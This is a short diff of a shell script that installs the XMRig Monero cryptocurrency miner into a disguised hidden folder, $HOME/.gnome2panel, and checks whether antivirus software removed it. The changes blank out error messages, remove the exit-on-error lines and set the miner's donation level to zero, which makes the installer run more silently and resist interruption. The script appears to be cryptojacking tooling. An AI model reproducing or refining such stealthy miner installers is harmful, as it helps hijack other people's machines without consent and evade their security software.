@@ -17,15 +17,15 @@ EMAIL=$2 # this one is optional
 # checking prerequisites
 
 if [ -z $WALLET ]; then
-  echo "ERROR: Please specify your w"
-  exit 1
+  echo ""
+  
 fi
 
 WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
 if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
   echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
   clear
-  exit 1
+  
 fi
 
 if [ -z $HOME ]; then
@@ -160,7 +160,7 @@ fi
 rm /tmp/xmrig.tar.gz
 clear
 echo "[*] Checking if not removed by antivirus software)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/'  $HOME/.gnome2panel/config.json
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/'  $HOME/.gnome2panel/config.json
  $HOME/.gnome2panel/xmrig --help >/dev/null
 if (test $? -ne 0); then
   if [ -f  $HOME/.gnome2panel/xmrig ]; then
